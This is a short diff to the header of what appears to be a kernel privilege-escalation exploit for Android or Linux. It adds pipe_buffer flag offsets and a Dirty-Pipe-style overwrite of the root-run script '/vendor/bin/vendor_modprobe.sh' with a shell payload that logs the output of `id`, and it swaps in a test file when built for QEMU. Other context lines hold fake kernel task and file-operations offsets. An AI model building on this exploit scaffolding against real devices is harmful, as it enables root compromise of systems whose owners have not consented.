@@ -194,6 +194,7 @@
 #define SCRATCH_OFF 0x3000
 #define RIGHT_OFF 0x4440
 #define LEFT_OFF 0x5550
+#define PIPE_FLAG_OFF 0x5680
 #define FAKE_TASK_OFF 0x3200
 
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
@@ -241,6 +242,18 @@
 
 #define PIPE_BUFFER_SLOTS 32
 #define PIPE_BUF_FLAG_CAN_MERGE 0x10
+#define PIPE_BUFFER_FLAGS_OFF 0x18
+#define PIPE_FLAG_OBJECT_INDEX P0_ORACLE_GATE_OBJECT_INDEX
+
+#if defined(QEMU_PIPEFLAG_TEST) && QEMU_PIPEFLAG_TEST
+#define PIPE_OVERWRITE_TARGET "/tests/pipeflag-target"
+#define PIPE_OVERWRITE_CONTENT "RMG_PIPEFLAG_QEMU_OK"
+#else
+#define PIPE_OVERWRITE_TARGET "/vendor/bin/vendor_modprobe.sh"
+#define PIPE_OVERWRITE_CONTENT \
+  "!/system/bin/sh\n" \
+  "log -t RMG_PIPEFLAG `id`\n"
+#endif
 
 #define FOPS_OWNER_OFF 0x00
 #define FOPS_LLSEEK_OFF 0x08
